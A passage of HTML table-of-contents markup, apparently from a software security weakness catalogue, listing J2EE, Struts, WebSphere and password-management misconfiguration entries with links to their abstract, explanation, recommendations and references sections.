Misconfiguration: Missing Filter Definition</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-198"><span class="toc-number">1.4.58.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-199"><span class="toc-number">1.4.58.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-198"><span class="toc-number">1.4.58.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-197"><span class="toc-number">1.4.58.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Security-Role"><span class="toc-number">1.4.59.</span> <span class="toc-text">J2EE Misconfiguration: Missing Security Role</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-199"><span class="toc-number">1.4.59.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-200"><span class="toc-number">1.4.59.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-199"><span class="toc-number">1.4.59.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-198"><span class="toc-number">1.4.59.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Missing-Servlet-Mapping"><span class="toc-number">1.4.60.</span> <span class="toc-text">J2EE Misconfiguration: Missing Servlet Mapping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-200"><span class="toc-number">1.4.60.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-201"><span class="toc-number">1.4.60.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-200"><span class="toc-number">1.4.60.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-199"><span class="toc-number">1.4.60.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Unsafe-Bean-Declaration"><span class="toc-number">1.4.61.</span> <span class="toc-text">J2EE Misconfiguration: Unsafe Bean Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-201"><span class="toc-number">1.4.61.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-202"><span class="toc-number">1.4.61.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-201"><span class="toc-number">1.4.61.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-200"><span class="toc-number">1.4.61.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Misconfiguration-Weak-Access-Permissions"><span class="toc-number">1.4.62.</span> <span class="toc-text">J2EE Misconfiguration: Weak Access Permissions</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-202"><span class="toc-number">1.4.62.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-203"><span class="toc-number">1.4.62.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-202"><span class="toc-number">1.4.62.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-201"><span class="toc-number">1.4.62.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Empty-Password-in-Configuration-File"><span class="toc-number">1.4.63.</span> <span class="toc-text">Password Management: Empty Password in Configuration File</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-203"><span class="toc-number">1.4.63.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-204"><span class="toc-number">1.4.63.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-203"><span class="toc-number">1.4.63.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-202"><span class="toc-number">1.4.63.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Password-in-Configuration-File"><span class="toc-number">1.4.64.</span> <span class="toc-text">Password Management: Password in Configuration File</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-204"><span class="toc-number">1.4.64.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-205"><span class="toc-number">1.4.64.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-204"><span class="toc-number">1.4.64.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-203"><span class="toc-number">1.4.64.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Duplicate-Form-Bean"><span class="toc-number">1.4.65.</span> <span class="toc-text">Struts Misconfiguration: Duplicate Form Bean</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-205"><span class="toc-number">1.4.65.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-206"><span class="toc-number">1.4.65.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-205"><span class="toc-number">1.4.65.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-204"><span class="toc-number">1.4.65.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Invalid-Path"><span class="toc-number">1.4.66.</span> <span class="toc-text">Struts Misconfiguration: Invalid Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-206"><span class="toc-number">1.4.66.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-207"><span class="toc-number">1.4.66.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-206"><span class="toc-number">1.4.66.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-205"><span class="toc-number">1.4.66.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Action-Input"><span class="toc-number">1.4.67.</span> <span class="toc-text">Struts Misconfiguration: Missing Action Input</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-207"><span class="toc-number">1.4.67.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-208"><span class="toc-number">1.4.67.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-207"><span class="toc-number">1.4.67.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-206"><span class="toc-number">1.4.67.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Exception-Type"><span class="toc-number">1.4.68.</span> <span class="toc-text">Struts Misconfiguration: Missing Exception Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-208"><span class="toc-number">1.4.68.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-209"><span class="toc-number">1.4.68.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-208"><span class="toc-number">1.4.68.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-207"><span class="toc-number">1.4.68.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean"><span class="toc-number">1.4.69.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-209"><span class="toc-number">1.4.69.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-210"><span class="toc-number">1.4.69.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-209"><span class="toc-number">1.4.69.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-208"><span class="toc-number">1.4.69.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean-Name"><span class="toc-number">1.4.70.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-210"><span class="toc-number">1.4.70.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-211"><span class="toc-number">1.4.70.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-210"><span class="toc-number">1.4.70.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-209"><span class="toc-number">1.4.70.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Bean-Type"><span class="toc-number">1.4.71.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Bean Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-211"><span class="toc-number">1.4.71.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-212"><span class="toc-number">1.4.71.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-211"><span class="toc-number">1.4.71.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-210"><span class="toc-number">1.4.71.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Form-Property-Type"><span class="toc-number">1.4.72.</span> <span class="toc-text">Struts Misconfiguration: Missing Form Property Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-212"><span class="toc-number">1.4.72.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-213"><span class="toc-number">1.4.72.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-212"><span class="toc-number">1.4.72.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-211"><span class="toc-number">1.4.72.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Forward-Name"><span class="toc-number">1.4.73.</span> <span class="toc-text">Struts Misconfiguration: Missing Forward Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-213"><span class="toc-number">1.4.73.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-214"><span class="toc-number">1.4.73.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-213"><span class="toc-number">1.4.73.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-212"><span class="toc-number">1.4.73.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Misconfiguration-Missing-Forward-Path"><span class="toc-number">1.4.74.</span> <span class="toc-text">Struts Misconfiguration: Missing Forward Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-214"><span class="toc-number">1.4.74.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-215"><span class="toc-number">1.4.74.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-214"><span class="toc-number">1.4.74.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-213"><span class="toc-number">1.4.74.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Misconfiguration-Missing-Nonce"><span class="toc-number">1.4.75.</span> <span class="toc-text">WebSphere Misconfiguration: Missing Nonce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-215"><span class="toc-number">1.4.75.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-216"><span class="toc-number">1.4.75.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-215"><span class="toc-number">1.4.75.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-214"><span class="toc-number">1.4.75.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Misconfiguration-Servlets-Served-By-Class-Name"><span class="toc-number">1.4.76.</span> <span class="toc-text">WebSphere Misconfiguration: Servlets Served By Class Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-216"><span class="toc-number">1.4.76.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-217"><span class="toc-number">1.4.76.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-216"><span class="toc-number">1.4.76.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-215"><span class="toc-number">1.4.76.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.77.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-217"><span class="toc-number">1.4.77.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-218"><span class="toc-number">1.4.77.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-217"><span class="toc-number">1.4.77.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-216"><span class="toc-number">1.4.77.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.78.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-218"><span class="toc-number">1.4.78.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-219"><span class="toc-number">1.4.78.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-218"><span class="toc-number">1.4.78.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-217"><span class="toc-number">1.4.78.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.79.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-219"><span class="toc-number">1.4.79.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-220"><span class="toc-number">1.4.79.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-219"><span class="toc-number">1.4.79.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-218"><span class="toc-number">1.4.79.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.80.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-220"><span class="toc-number">1.4.80.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-221"><span class="toc-number">1.4.80.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-220"><span class="toc-number">1.4.80.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-219"><span class="toc-number">1.4.80.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.81.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-221"><span class="toc-number">1.4.81.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-222"><span class="toc-number">1.4.81.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-221"><span class="toc-number">1.4.81.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-220"><span class="toc-number">1.4.81.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.82.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-222"><span class="toc-number">1.4.82.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-223"><span class="toc-number">1.4.82.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-222"><span class="toc-number">1.4.82.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-221"><span class="toc-number">1.4.82.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.83.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-223"><span class="toc-number">1.4.83.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-224"><span class="toc-number">1.4.83.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-223"><span class="toc-number">1.4.83.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-222"><span class="toc-number">1.4.83.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Missing-Timestamp-Expiration"><span class="toc-number">1.4.84.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Missing Timestamp Expiration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-224"><span class="toc-number">1.4.84.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-225"><span class="toc-number">1.4.84.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-224"><span class="toc-number">1.4.84.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-223"><span class="toc-number">1.4.84.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.85.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-225"><span class="toc-number">1.4.85.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-226"><span class="toc-number">1.4.85.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-225"><span class="toc-number">1.4.85.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-224"><span class="toc-number">1.4.85.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.86.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-226"><span class="toc-number">1.4.86.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-227"><span class="toc-number">1.4.86.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-226"><span class="toc-number">1.4.86.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-225"><span class="toc-number">1.4.86.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.87.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-227"><span class="toc-number">1.4.87.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-228"><span class="toc-number">1.4.87.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-227"><span class="toc-number">1.4.87.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-226"><span class="toc-number">1.4.87.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.88.</span> <span class="toc-text">WebSphere Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-228"><span class="toc-number">1.4.88.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-229"><span class="toc-number">1.4.88.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-228"><span class="toc-number">1.4.88.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-227"><span class="toc-number">1.4.88.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.89.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-229"><span class="toc-number">1.4.89.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-230"><span class="toc-number">1.4.89.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-229"><span class="toc-number">1.4.89.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-228"><span class="toc-number">1.4.89.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.90.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-230"><span class="toc-number">1.4.90.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-231"><span class="toc-number">1.4.90.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-230"><span class="toc-number">1.4.90.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-229"><span class="toc-number">1.4.90.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSphere-Service-Requester-Misconfiguration-Missing-Inbound-Encryption-1"><span class="toc-number">1.4.91.</span> <span class="toc-text">WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-231"><span class="toc-number">1.4.91.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-232"><span class="toc-number">1.4.91.2.</span> <span 